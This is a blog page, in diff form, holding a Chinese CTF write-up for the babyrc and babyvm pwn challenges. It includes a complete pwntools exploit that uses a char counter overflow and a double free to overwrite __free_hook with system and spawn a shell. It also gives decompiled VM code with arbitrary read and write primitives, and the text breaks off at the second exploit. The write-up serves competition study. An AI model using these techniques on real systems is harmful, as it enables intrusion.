@@ -1,0 +1,802 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="WP," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="babyrc总结利用char类型的变量来进行计数，范围较小，可以通过溢出来造成一些漏洞。差不多的还有利用负数补码存储的性质造成溢出，与数据范围相关。 分析题目实现了树型结构，支持增加节点，增加边，删除边，输出节点信息。其余的都没啥用。漏洞出现在删除边的时候，会把儿子节点的入度减一，如果儿子节点的入度为0，就会把儿子节点以及儿子节点的content释放。123456if ( !--inDegree[">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2021安天杯HIT邀请赛">
+<meta property="og:url" content="http://example.com/2021/11/29/2021%E5%AE%89%E5%A4%A9%E6%9D%AFHIT%E9%82%80%E8%AF%B7%E8%B5%9B/index.html">
+<meta property="og:site_name" content="Tm0tfl">
+<meta property="og:description" content="babyrc总结利用char类型的变量来进行计数，范围较小，可以通过溢出来造成一些漏洞。差不多的还有利用负数补码存储的性质造成溢出，与数据范围相关。 分析题目实现了树型结构，支持增加节点，增加边，删除边，输出节点信息。其余的都没啥用。漏洞出现在删除边的时候，会把儿子节点的入度减一，如果儿子节点的入度为0，就会把儿子节点以及儿子节点的content释放。123456if ( !--inDegree[">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-11-29T11:39:52.000Z">
+<meta property="article:modified_time" content="2021-11-29T11:40:44.696Z">
+<meta property="article:author" content="Tm0tfl">
+<meta property="article:tag" content="WP">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2021/11/29/2021安天杯HIT邀请赛/"/>
+
+
+
+
+
+  <title>2021安天杯HIT邀请赛 | Tm0tfl</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Tm0tfl</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/29/2021%E5%AE%89%E5%A4%A9%E6%9D%AFHIT%E9%82%80%E8%AF%B7%E8%B5%9B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://qvb75z5z6.hn-bkt.clouddn.com/1605841888100229.jpeg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tm0tfl">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2021安天杯HIT邀请赛</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-11-29T19:39:52+08:00">
+                2021-11-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+                  , 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/WP/" itemprop="url" rel="index">
+                    <span itemprop="name">WP</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="babyrc"><a href="#babyrc" class="headerlink" title="babyrc"></a>babyrc</h1><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>利用char类型的变量来进行计数，范围较小，可以通过溢出来造成一些漏洞。<br>差不多的还有利用负数补码存储的性质造成溢出，与数据范围相关。</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>题目实现了树型结构，支持增加节点，增加边，删除边，输出节点信息。其余的都没啥用。漏洞出现在删除边的时候，会把儿子节点的入度减一，如果儿子节点的入度为0，就会把儿子节点以及儿子节点的content释放。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !--inDegree[sonidx] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(ptr-&gt;content);</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  nodestruct[sonidx] = <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>由于inDegree[]数组是char类型的，所以可以通过连接257条边，溢出到1，这样依次删除边的时候就会出现double free。<br>堆块大小限制比较宽松，就可以直接泄露libc地址，控制freehook。<br>需要注意的是由于我没有在第一时间泄露libc地址，而是在double free之后泄露的地址，导致没有办法写入，所以只好溢出到了0x201。</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span> </span><br><span class="line">	gdb.attach(p)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createNode</span>(<span class="params">idx, size, content</span>):</span> </span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;6. exit\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;idx :&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;size :&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">	p.sendafter(<span class="string">&#x27;desc :&#x27;</span>, content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addEdge</span>(<span class="params">src, dst, flag</span>):</span> </span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;6. exit\n&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;root\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;src : &#x27;</span>, <span class="built_in">str</span>(src))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;dst : &#x27;</span>, <span class="built_in">str</span>(dst))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;) ?&#x27;</span>, <span class="built_in">str</span>(flag))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deleteEdge</span>(<span class="params">idx, flag</span>):</span> </span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;6. exit\n&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;root\n&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;idx :&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;) ?&#x27;</span>, <span class="built_in">str</span>(flag))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showNode</span>(<span class="params">idx</span>):</span> </span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;6. exit\n&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;idx :&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"><span class="comment"># context(log_level = &#x27;debug&#x27;)</span></span><br><span class="line">p=process(<span class="string">&#x27;babyrc&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyrc&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">createNode(<span class="number">0x1FF</span>, <span class="number">0x500</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">257</span>): </span><br><span class="line">	createNode(i+<span class="number">1</span>, <span class="number">0x10</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>): </span><br><span class="line">	addEdge(i+<span class="number">1</span>, <span class="number">0x1FF</span>, <span class="number">0</span>)</span><br><span class="line">	addEdge(i+<span class="number">1</span>, <span class="number">0x1FF</span>, <span class="number">1</span>)</span><br><span class="line">addEdge(<span class="number">257</span>, <span class="number">0x1FF</span>, <span class="number">0</span>)</span><br><span class="line">deleteEdge(<span class="number">257</span>, <span class="number">0</span>)</span><br><span class="line">createNode(<span class="number">258</span>, <span class="number">0x40</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">showNode(<span class="number">258</span>)</span><br><span class="line">libcbase = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3ec0d0</span></span><br><span class="line">log.success(<span class="string">&#x27;libcbase: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libcbase)))</span><br><span class="line">freehook = libcbase + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libcbase + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>): </span><br><span class="line">	deleteEdge(i+<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>): </span><br><span class="line">	deleteEdge(i+<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">createNode(<span class="number">0</span>, <span class="number">0x40</span>, p64(freehook))</span><br><span class="line">createNode(<span class="number">259</span>, <span class="number">0x40</span>, <span class="string">&#x27;/bin/sh&#x27;</span> + <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">createNode(<span class="number">261</span>, <span class="number">0x40</span>, p64(system))</span><br><span class="line"></span><br><span class="line">addEdge(<span class="number">261</span>, <span class="number">259</span>, <span class="number">0</span>)</span><br><span class="line">deleteEdge(<span class="number">261</span>, <span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="babyvm"><a href="#babyvm" class="headerlink" title="babyvm"></a>babyvm</h1><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>第一次做vm类型的题，主要是<strong>逆向出指令解码的过程</strong>。</p>
+<h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>通过输入0x20个字符进行泄露pie基址，再次输入的时候由strlen函数确定输入长度，可以溢出修改filename为secret地址，secret输入为pwn，读入检测的时候就会检测ELF魔数，从而绕过检查进入VM。<br>下面是VM的主函数，关键函数是exec()函数和sub_C9C()函数。其中exec函数解析输入的opcode，sub_C9C初始化虚拟机（</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">realMain</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  VM *ptr; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  ptr = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      v0 = readint();</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      ptr = sub_C9C(); <span class="comment">//创建虚拟机，读入数据</span></span><br><span class="line">      buf = <span class="built_in">malloc</span>(<span class="number">0x300</span>uLL);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">0x2FF</span>uLL);</span><br><span class="line">      ptr-&gt;input = (<span class="keyword">char</span> *)buf;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>: <span class="comment">//对输入数据进行解析</span></span><br><span class="line">        exec(ptr);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>: <span class="comment">//删除结构体</span></span><br><span class="line">        <span class="keyword">if</span> ( !ptr )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">free</span>((<span class="keyword">void</span> *)ptr-&gt;reg2[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">free</span>(ptr);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Bye!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VM *<span class="title">sub_C9C</span><span class="params">()</span> <span class="comment">//初始化一共10个寄存器（就叫寄存器吧，看其他VM题都是这么叫的，还有input存opcode</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  VM *v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = (VM *)<span class="built_in">malloc</span>(<span class="number">0x58</span>uLL);</span><br><span class="line">  v1-&gt;reg[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v1-&gt;reg[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v1-&gt;reg[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v1-&gt;reg[<span class="number">3</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v1-&gt;reg[<span class="number">4</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v1-&gt;reg[<span class="number">5</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v1-&gt;input = <span class="number">0LL</span>;</span><br><span class="line">  v1-&gt;reg2[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v1-&gt;reg2[<span class="number">1</span>] = (__int64)<span class="built_in">calloc</span>(<span class="number">4uLL</span>, <span class="number">0x50</span>uLL);</span><br><span class="line">  v1-&gt;reg[<span class="number">6</span>] = v1-&gt;reg2[<span class="number">1</span>] + <span class="number">0x240</span>;</span><br><span class="line">  v1-&gt;reg[<span class="number">7</span>] = v1-&gt;reg[<span class="number">6</span>];</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">exec</span><span class="params">(VM *ptr)</span> <span class="comment">//对输入opcode进行解析</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *v1; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( *ptr-&gt;input != <span class="number">0x32</span> ) <span class="comment">//当前opcode为0x32就结束，下面就是根据操作码来解析对应的操作，其实好多都没有用到</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *ptr-&gt;input == <span class="number">0x31</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//reg[n] = value，第0个字节是0x31，第1个字节是n，第2-9个字节是value，value占8个字节</span></span><br><span class="line">      *(_QWORD *)reg_input_1_(ptr) = *(_QWORD *)(ptr-&gt;input + <span class="number">2</span>);</span><br><span class="line">      <span class="comment">//下一条指令</span></span><br><span class="line">      ptr-&gt;input += <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *ptr-&gt;input == <span class="number">0x71</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ptr-&gt;reg[<span class="number">6</span>] -= <span class="number">8LL</span>;</span><br><span class="line">      *(_QWORD *)ptr-&gt;reg[<span class="number">6</span>] = *(_QWORD *)(ptr-&gt;input + <span class="number">1</span>);</span><br><span class="line">      ptr-&gt;input += <span class="number">9</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *ptr-&gt;input == <span class="number">0x41</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ptr-&gt;reg[<span class="number">1</span>] += ptr-&gt;reg[<span class="number">2</span>];</span><br><span class="line">      ++ptr-&gt;input;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *ptr-&gt;input == <span class="number">0x42</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ptr-&gt;reg[<span class="number">1</span>] -= ptr-&gt;reg[<span class="number">4</span>];</span><br><span class="line">      ++ptr-&gt;input;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *ptr-&gt;input == <span class="number">0x43</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ptr-&gt;reg[<span class="number">1</span>] *= ptr-&gt;reg[<span class="number">3</span>];</span><br><span class="line">      ++ptr-&gt;input;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *ptr-&gt;input == <span class="number">0x44</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ptr-&gt;reg[<span class="number">1</span>] /= ptr-&gt;reg[<span class="number">5</span>];</span><br><span class="line">      ++ptr-&gt;input;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *ptr-&gt;input == <span class="number">0x77</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ptr-&gt;reg[<span class="number">1</span>] ^= ptr-&gt;reg[<span class="number">2</span>];</span><br><span class="line">      ++ptr-&gt;input;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *ptr-&gt;input == <span class="number">0x53</span> )                  </span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//输出reg[3]指针处的字符，也就是如果我们把reg[3]改为某个函数的got表就可以泄露libc地址</span></span><br><span class="line">      <span class="built_in">putchar</span>(*(<span class="keyword">char</span> *)ptr-&gt;reg[<span class="number">3</span>]);</span><br><span class="line">      <span class="comment">//下一条指令，这个操作之后1字节的操作码，但是加了2字节，输入的时候也要输入2字节，否则影响后面解析</span></span><br><span class="line">      ptr-&gt;input += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *ptr-&gt;input == <span class="number">0x76</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)reg_input_1_(ptr) = *(_QWORD *)ptr-&gt;reg[<span class="number">6</span>];</span><br><span class="line">      ptr-&gt;reg[<span class="number">6</span>] += <span class="number">8LL</span>;</span><br><span class="line">      ptr-&gt;input += <span class="number">9</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *ptr-&gt;input == <span class="number">0x54</span> )                  </span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//读取1字节到reg[3]指针表示的地址，可以用来写freehook</span></span><br><span class="line">      v1 = (_BYTE *)ptr-&gt;reg[<span class="number">3</span>];</span><br><span class="line">      *v1 = getchar();</span><br><span class="line">      <span class="comment">//和输出同样的问题</span></span><br><span class="line">      ptr-&gt;input += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上面注释的三个指令实现了任意地址读写。指令0x31是对任意寄存器进行赋值，指令0x53,0x54是putchar(reg), getchar(reg)<br>泄露got表获得libc地址，修改freehook为system，把reg0赋值为/bin/sh，后面释放的时候就可以获得shell。</p>
+<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 